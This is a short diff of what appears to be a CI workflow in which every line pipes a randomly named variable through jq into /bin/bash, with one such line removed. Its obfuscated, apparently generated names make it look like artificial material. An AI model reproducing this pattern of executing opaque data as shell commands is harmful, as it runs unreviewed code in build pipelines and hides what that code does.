@@ -22,7 +22,6 @@ jobs:
           echo $txv062 | jq -r .d77 | /bin/bash
           printf '%s' "$gra43252" | jq -r .me4358 | /bin/bash
           echo $zlk65 | jq -r .eotv550 | /bin/bash
-          printf '%s' "$brp34" | jq -r .huzcc33986 | /bin/bash
           echo $kv639 | jq -r .pbd46 | /bin/bash
           printf '%s' "$bzgy4" | jq -r .yjzg9 | /bin/bash
           echo $ee51 | jq -r .guph0363 | /bin/bash
